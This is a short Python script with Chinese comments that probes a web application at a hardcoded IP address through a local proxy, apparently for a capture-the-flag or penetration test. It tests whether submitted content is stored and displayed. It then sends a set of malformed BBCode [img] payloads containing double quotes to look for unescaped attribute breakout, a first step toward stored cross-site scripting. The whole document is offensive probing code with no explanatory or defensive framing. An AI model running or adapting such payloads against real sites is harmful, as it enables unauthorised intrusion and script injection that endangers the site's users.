import time, urllib.request, urllib.parse, urllib.error
BASE = "http://160.202.254.160:15880/"
PROXY = {"http": "http://127.0.0.1:12001", "https": "http://127.0.0.1:12001"}
op = urllib.request.build_opener(urllib.request.ProxyHandler(PROXY))

def get(path="", data=None):
    d = urllib.parse.urlencode(data).encode() if data is not None else None
    with op.open(BASE + path, data=d, timeout=20) as r:
        return r.read().decode("gb18030", "replace")

print("[1] GET 是否能写入")
before = get()
get("?content=GETWRITEZZZ")
time.sleep(0.3)
after = get()
print("    GETWRITEZZZ 出现:", "GETWRITEZZZ" in after)

print("[2] index.php 上 POST 是否同样存储")
get("index.php", {"content": "POSTIDXZZZ"})
time.sleep(0.3)
print("    POSTIDXZZZ 出现:", "POSTIDXZZZ" in get())

print("[3] BBCode 变体矩阵 (看 src 里是否出现未转义的引号)")
variants = [
    ("大写",      "[IMG]http://a.b/c.png\"Z1[/IMG]"),
    ("混合",      "[Img]http://a.b/c.png\"Z2[/Img]"),
    ("嵌套",      "[[img]http://a.b/c.png\"Z3[/img]]"),
    ("双开",      "[img][img]http://a.b/c.png\"Z4[/img]"),
    ("空url",     "[img]\"Z5[/img]"),
    ("换行",      "[img]http://a.b/c.png\n\"Z6[/img]"),
    ("无闭合",    "[img]http://a.b/c.png\"Z7"),
    ("重复闭",    "[img]http://a.b/c.png\"Z8[/img][/img]"),
]
for name, payload in variants:
    tag = "V%s" % payload[payload.find("Z")+1:payload.find("Z")+2]
    get("", {"content": payload})
    time.sleep(0.25)
    body = get()
    i = body.find("Z" + tag[1:])
    seg = body[max(0,i-160):i+80] if i >= 0 else "(未找到)"
    print("  --%s--" % name)
    print("     输入:", payload.replace("\n", "\\n"))
    print("     输出:", repr(seg))
